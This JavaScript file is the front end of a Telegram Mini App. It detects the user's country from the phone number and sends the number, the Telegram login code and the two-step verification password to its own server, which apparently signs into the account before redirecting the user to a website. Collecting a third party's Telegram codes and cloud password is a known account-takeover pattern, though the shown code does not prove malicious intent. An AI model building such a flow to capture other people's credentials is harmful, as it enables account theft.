/* Telegram Mini App — phone number + OTP login flow. */
(function () {
  'use strict';

  var tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;

  var POPULAR = ['BD', 'IN', 'US', 'GB', 'ID', 'PK', 'NG', 'AE', 'SA', 'MY'];
  // +1 is shared by Canada, the Caribbean and several US territories, so the
  // area code is the only way to tell them apart. Unknown -> US.
  var NANP = {
    '204': 'CA', '226': 'CA', '236': 'CA', '249': 'CA', '250': 'CA', '263': 'CA',
    '289': 'CA', '306': 'CA', '343': 'CA', '354': 'CA', '365': 'CA', '367': 'CA',
    '368': 'CA', '382': 'CA', '387': 'CA', '403': 'CA', '416': 'CA', '418': 'CA',
    '428': 'CA', '431': 'CA', '437': 'CA', '438': 'CA', '450': 'CA', '468': 'CA',
    '474': 'CA', '506': 'CA', '514': 'CA', '519': 'CA', '548': 'CA', '579': 'CA',
    '581': 'CA', '584': 'CA', '587': 'CA', '604': 'CA', '613': 'CA', '639': 'CA',
    '647': 'CA', '683': 'CA', '705': 'CA', '709': 'CA', '742': 'CA', '753': 'CA',
    '778': 'CA', '780': 'CA', '782': 'CA', '807': 'CA', '819': 'CA', '825': 'CA',
    '867': 'CA', '873': 'CA', '879': 'CA', '902': 'CA', '905': 'CA',
    '242': 'BS', '246': 'BB', '264': 'AI', '268': 'AG', '284': 'VG', '340': 'VI',
    '345': 'KY', '441': 'BM', '473': 'GD', '649': 'TC', '658': 'JM', '664': 'MS',
    '670': 'MP', '671': 'GU', '684': 'AS', '721': 'SX', '758': 'LC', '767': 'DM',
    '784': 'VC', '787': 'PR', '809': 'DO', '829': 'DO', '849': 'DO', '868': 'TT',
    '869': 'KN', '876': 'JM', '939': 'PR'
  };
  // Calling codes shared by several countries: guess the main one.
  var PRIMARY = { '1': 'US', '7': 'RU', '44': 'GB', '47': 'NO', '64': 'NZ', '212': 'MA', '262': 'RE', '500': 'FK', '590': 'GP' };

  var el = {
    alert: document.getElementById('alert'),
    screenPhone: document.getElementById('screen-phone'),
    screenCode: document.getElementById('screen-code'),
    screenDone: document.getElementById('screen-done'),
    phoneForm: document.getElementById('phone-form'),
    codeForm: document.getElementById('code-form'),
    country: document.getElementById('country'),
    phone: document.getElementById('phone'),
    detectedHint: document.getElementById('detected-hint'),
    phoneSubmit: document.getElementById('phone-submit'),
    code: document.getElementById('code'),
    codeSubmit: document.getElementById('code-submit'),
    codeHint: document.getElementById('code-hint'),
    passwordField: document.getElementById('password-field'),
    password: document.getElementById('password'),
    passwordHint: document.getElementById('password-hint'),
    resendBtn: document.getElementById('resend-btn'),
    changeBtn: document.getElementById('change-btn'),
    doneHint: document.getElementById('done-hint'),
    continueLink: document.getElementById('continue-link'),
    userChip: document.getElementById('user-chip')
  };

  var state = {
    countries: [],
    byIso: {},
    byDial: {},
    dialOrder: [],
    attemptId: null,
    e164: '',
    maskedPhone: '',
    needsPassword: false,
    redirectUrl: null,
    resendTimer: null,
    redirectTimer: null
  };

  /* ------------------------------------------------------------------ theme */

  function applyTheme() {
    if (!tg || !tg.themeParams) return;
    var p = tg.themeParams;
    var root = document.documentElement;
    var set = function (name, value) {
      if (value) root.style.setProperty(name, value);
    };
    set('--tg-bg', p.bg_color);
    set('--tg-text', p.text_color);
    set('--tg-hint', p.hint_color);
    set('--tg-link', p.link_color);
    set('--tg-button', p.button_color);
    set('--tg-button-text', p.button_text_color);
    set('--tg-secondary-bg', p.secondary_bg_color);
    set('--tg-section-bg', p.section_bg_color);
    set('--tg-separator', p.section_separator_color);
  }

  /* ---------------------------------------------------------------- helpers */

  function flagOf(iso) {
    if (!/^[A-Za-z]{2}$/.test(iso || '')) return '';
    return String.fromCodePoint.apply(
      null,
      iso.toUpperCase().split('').map(function (c) {
        return 0x1f1a5 + c.charCodeAt(0);
      })
    );
  }

  function showScreen(name) {
    el.screenPhone.hidden = name !== 'phone';
    el.screenCode.hidden = name !== 'code';
    el.screenDone.hidden = name !== 'done';
  }

  function setAlert(message, kind) {
    if (!message) {
      el.alert.hidden = true;
      el.alert.textContent = '';
      return;
    }
    el.alert.hidden = false;
    el.alert.textContent = message;
    el.alert.classList.toggle('alert--ok', kind === 'ok');
  }

  function setLoading(button, loading) {
    button.classList.toggle('is-loading', !!loading);
    button.disabled = !!loading;
  }

  function haptic(type) {
    try {
      if (tg && tg.HapticFeedback) tg.HapticFeedback.notificationOccurred(type);
    } catch (err) {
      /* haptics are optional */
    }
  }

  function api(path, options) {
    var opts = options || {};
    return fetch(path, {
      method: opts.method || 'GET',
      headers: {
        'Content-Type': 'application/json',
        'X-Telegram-Init-Data': (tg && tg.initData) || ''
      },
      body: opts.body ? JSON.stringify(opts.body) : undefined,
      cache: 'no-store'
    })
      .then(function (res) {
        return res
          .json()
          .catch(function () {
            return {};
          })
          .then(function (data) {
            if (!res.ok) {
              var error = new Error(data.message || 'Request failed (' + res.status + ')');
              error.code = data.error;
              error.data = data;
              error.status = res.status;
              throw error;
            }
            return data;
          });
      });
  }

  /* ------------------------------------------------------------------ phone */

  function toDigits(value) {
    return String(value || '')
      .replace(/[^\d+]/g, '')
      .replace(/^(00|\+)/, '');
  }

  function startsInternational(value) {
    return /^\s*(\+|00)/.test(String(value || ''));
  }

  function matchDial(digits) {
    for (var i = 0; i < state.dialOrder.length; i += 1) {
      if (digits.indexOf(state.dialOrder[i]) === 0) return state.dialOrder[i];
    }
    return null;
  }

  function countryForDial(dial, nsn) {
    if (dial === '1') return state.byIso[resolveNanp(nsn)] || state.byIso.US;
    var list = state.byDial[dial];
    if (!list || !list.length) return null;
    return state.byIso[PRIMARY[dial]] || list[0];
  }

  function selectCountry(iso) {
    if (iso && state.byIso[iso]) el.country.value = iso;
  }

  function describeDetection() {
    var value = el.phone.value;
    var hint = el.detectedHint;

    hint.classList.remove('field__hint--ok', 'field__hint--bad');

    if (!value.trim()) {
      hint.textContent = 'Include your country code, for example +880, or pick a country above.';
      return;
    }

    if (startsInternational(value)) {
      var digits = toDigits(value);
      var dial = matchDial(digits);
      if (!dial) {
        hint.textContent = 'That country calling code is not supported yet.';
        hint.classList.add('field__hint--bad');
        return;
      }
      var country = countryForDial(dial, digits.slice(dial.length));
      if (!country) {
        hint.textContent = 'That country calling code is not supported yet.';
        hint.classList.add('field__hint--bad');
        return;
      }
      selectCountry(country.iso);
      var range = country.nslen[0] === country.nslen[1]
        ? country.nslen[0] + ' digit' + (country.nslen[0] === 1 ? '' : 's')
        : country.nslen[0] + '–' + country.nslen[1] + ' digits';
      hint.textContent = flagOf(country.iso) + ' ' + country.name + ' · +' + country.dial + ' · expect ' + range;
      hint.classList.add('field__hint--ok');
      return;
    }

    var selected = state.byIso[el.country.value];
    if (selected) {
      hint.textContent =
        'Using ' + flagOf(selected.iso) + ' ' + selected.name + ' (+' + selected.dial + '). ' +
        'Type +' + selected.dial + ' instead to type the full number.';
    } else {
      hint.textContent = 'Please pick a country.';
    }
  }

  /* --------------------------------------------------------------- countries */

  function buildCountrySelect() {
    var popular = [];
    var rest = [];
    state.countries.forEach(function (country) {
      var label = flagOf(country.iso) + ' ' + country.name + '  +' + country.dial;
      var option = document.createElement('option');
      option.value = country.iso;
      option.textContent = label;
      if (POPULAR.indexOf(country.iso) !== -1 && popular.length < 10) popular.push(option);
      else rest.push(option);
    });

    rest.sort(function (a, b) {
      return a.textContent.replace(/^\S+\s/, '').localeCompare(b.textContent.replace(/^\S+\s/, ''));
    });

    var popularGroup = document.createElement('optgroup');
    popularGroup.label = 'Popular';
    popular.forEach(function (option) {
      popularGroup.appendChild(option);
    });

    var allGroup = document.createElement('optgroup');
    allGroup.label = 'All countries';
    rest.forEach(function (option) {
      allGroup.appendChild(option);
    });

    el.country.appendChild(popularGroup);
    el.country.appendChild(allGroup);
    selectCountry('BD');
  }

  /* ---------------------------------------------------------------- resend */

  function startResendCountdown(seconds) {
    var remaining = Math.max(1, seconds || 60);
    el.resendBtn.disabled = true;

    if (state.resendTimer) clearInterval(state.resendTimer);
    state.resendTimer = setInterval(function () {
      remaining -= 1;
      if (remaining <= 0) {
        clearInterval(state.resendTimer);
        state.resendTimer = null;
        el.resendBtn.disabled = false;
        el.resendBtn.textContent = 'Resend code';
        return;
      }
      el.resendBtn.textContent = 'Resend code in ' + remaining + 's';
    }, 1000);
  }

  /* ----------------------------------------------------------------- steps */

  function goToCodeStep(data) {
    state.attemptId = data.attemptId;
    state.e164 = data.phone || '';
    state.maskedPhone = data.maskedPhone || data.phone || '';
    state.needsPassword = false;

    el.passwordField.hidden = true;
    el.password.value = '';
    el.code.disabled = false;
    el.code.maxLength = 8;
    el.code.placeholder = '• • • • •';
    el.code.setAttribute('inputmode', 'numeric');
    el.codeHint.textContent = 'We sent a login code to ' + state.maskedPhone + '.';
    startResendCountdown(data.resend ? 5 : 60);

    showScreen('code');
    setAlert(null);
    el.code.focus();
  }

  function finish(phone) {
    if (!state.redirectUrl) {
      // Should not happen: the server always sends redirectUrl. Rather than
      // leave the user on a dead "done" screen, send them back to step one.
      el.changeBtn.click(); // resets the form and clears the alert
      setAlert('Could not work out where to send you. Please try again.');
      return;
    }

    showScreen('done');
    setAlert(null);
    el.doneHint.textContent = state.maskedPhone || phone
      ? 'Signed in as ' + (state.maskedPhone || phone) + '. Taking you to the website…'
      : 'Taking you to the website…';

    el.continueLink.href = state.redirectUrl;
    if (!el.continueLink.dataset.bound) {
      el.continueLink.dataset.bound = '1';
      el.continueLink.addEventListener('click', function (event) {
        event.preventDefault();
        openExternal(state.redirectUrl);
      });
    }

    clearTimeout(state.redirectTimer);
    state.redirectTimer = setTimeout(function () {
      openExternal(state.redirectUrl);
    }, 900);
  }

  function openExternal(url) {
    if (!url) return;
    try {
      if (tg && typeof tg.openLink === 'function') {
        tg.openLink(url, { try_instant_view: false });
        if (typeof tg.close === 'function') setTimeout(function () { tg.close(); }, 600);
        return;
      }
    } catch (err) {
      /* fall through to a normal navigation */
    }
    window.location.href = url;
  }

  /* ----------------------------------------------------------------- events */

  el.phoneForm.addEventListener('submit', function (event) {
    event.preventDefault();
    var phone = el.phone.value.trim();
    if (!phone) {
      setAlert('Please enter your phone number.');
      el.phone.focus();
      return;
    }

    setAlert(null);
    setLoading(el.phoneSubmit, true);
    state.needsPassword = false;
    el.passwordField.hidden = true;

    api('/api/auth/start', {
      method: 'POST',
      body: { phone: phone, country: el.country.value }
    })
      .then(function (data) {
        if (data.status === 'redirect') {
          state.redirectUrl = data.redirectUrl;
          state.maskedPhone = data.phone;
          finish(data.phone);
          return;
        }
        goToCodeStep(data);
      })
      .catch(function (err) {
        setAlert(err.message);
        haptic('error');
      })
      .then(function () {
        setLoading(el.phoneSubmit, false);
      });
  });

  el.codeForm.addEventListener('submit', function (event) {
    event.preventDefault();
    if (!state.attemptId) {
      setAlert('Your login session expired. Please start again.');
      showScreen('phone');
      return;
    }

    var payload = { attemptId: state.attemptId };
    if (state.needsPassword) {
      if (!el.password.value) {
        setAlert('Please enter your two-step verification password.');
        el.password.focus();
        return;
      }
      payload.password = el.password.value;
    } else {
      var code = el.code.value.trim();
      if (!code) {
        setAlert('Please enter the code from Telegram.');
        el.code.focus();
        return;
      }
      payload.code = code;
    }

    setAlert(null);
    setLoading(el.codeSubmit, true);

    api('/api/auth/verify', { method: 'POST', body: payload })
      .then(function (data) {
        state.redirectUrl = data.redirectUrl;
        haptic('success');
        finish(data.phone);
      })
      .catch(function (err) {
        if (err.code === 'password_needed') {
          state.needsPassword = true;
          el.passwordField.hidden = false;
          el.passwordHint.textContent = err.data && err.data.hint ? 'Hint: ' + err.data.hint : '';
          el.code.disabled = true;
          el.code.value = '';
          setAlert(err.message);
          el.password.focus();
          return;
        }
        if (err.code === 'restart_required') {
          // Telegram killed the flow (wrong 2FA password): drop back to the
          // number step instead of leaving a dead password form on screen.
          el.passwordField.hidden = true;
          el.code.disabled = false;
          el.changeBtn.click(); // resets state and clears the alert
          setAlert(err.message);
          el.phone.focus();
          return;
        }
        if (state.needsPassword) {
          el.password.value = '';
          el.password.focus();
        } else {
          el.code.select();
        }
        setAlert(
          err.data && err.data.remainingAttempts !== undefined
            ? err.message + ' (' + err.data.remainingAttempts + ' tries left)'
            : err.message
        );
        haptic('error');
      })
      .then(function () {
        setLoading(el.codeSubmit, false);
      });
  });

  el.resendBtn.addEventListener('click', function () {
    if (!state.attemptId || !state.e164 || el.resendBtn.disabled) return;
    el.resendBtn.disabled = true;
    setAlert(null);

    api('/api/auth/start', { method: 'POST', body: { phone: state.e164 } })
      .then(function (data) {
        if (data.status === 'redirect') {
          state.redirectUrl = data.redirectUrl;
          finish(data.phone);
          return;
        }
        state.attemptId = data.attemptId;
        el.codeHint.textContent = 'We sent a new login code to ' + (data.maskedPhone || state.maskedPhone) + '.';
        el.code.value = '';
        el.code.focus();
        startResendCountdown(60);
        setAlert('A new code is on its way.', 'ok');
      })
      .catch(function (err) {
        el.resendBtn.disabled = false;
        setAlert(err.message);
      });
  });

  el.changeBtn.addEventListener('click', function () {
    state.attemptId = null;
    state.e164 = '';
    state.needsPassword = false;
    state.redirectUrl = null;
    el.code.value = '';
    el.password.value = '';
    el.passwordField.hidden = true;
    el.code.disabled = false;
    if (state.resendTimer) {
      clearInterval(state.resendTimer);
      state.resendTimer = null;
    }
    if (state.redirectTimer) {
      clearTimeout(state.redirectTimer);
      state.redirectTimer = null;
    }
    el.resendBtn.disabled = false;
    el.resendBtn.textContent = 'Resend code';
    setAlert(null);
    showScreen('phone');
    el.phone.focus();
  });

  el.phone.addEventListener('input', describeDetection);
  el.phone.addEventListener('blur', describeDetection);
  el.country.addEventListener('change', describeDetection);

  /* ------------------------------------------------------------------- boot */

  function showUser() {
    if (!tg || !tg.initDataUnsafe || !tg.initDataUnsafe.user) return;
    var user = tg.initDataUnsafe.user;
    var name = [user.first_name, user.last_name].filter(Boolean).join(' ');
    el.userChip.textContent = (name || user.username || '')
      ? 'Signed in to Telegram as ' + (name || '@' + (user.username || ''))
      : '';
  }

  function init() {
    applyTheme();
    showUser();
    if (tg) {
      tg.ready();
      tg.expand();
      if (typeof tg.disableVerticalSwipes === 'function') tg.disableVerticalSwipes();
    }

    if (!tg || !tg.initData) {
      setAlert('Open this page from inside Telegram so we can verify who you are.');
      setLoading(el.phoneSubmit, true);
      return;
    }

    fetch('/shared/countries.json', { cache: 'no-store' })
      .then(function (res) {
        return res.json();
      })
      .then(function (list) {
        state.countries = list;
        list.forEach(function (country) {
          state.byIso[country.iso] = country;
          if (!state.byDial[country.dial]) state.byDial[country.dial] = [];
          state.byDial[country.dial].push(country);
        });
        state.dialOrder = Object.keys(state.byDial).sort(function (a, b) {
          return b.length - a.length;
        });
        buildCountrySelect();
        describeDetection();
      })
      .catch(function () {
        setAlert('Could not load the country list, please reopen the app.');
      });

    // Already have a session? Skip straight to the redirect.
    api('/api/auth/status')
      .then(function (data) {
        if (data.status === 'authenticated') {
          state.redirectUrl = data.redirectUrl;
          state.maskedPhone = data.phone;
          finish(data.phone);
        }
      })
      .catch(function () {
        /* anonymous is the normal path */
      });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
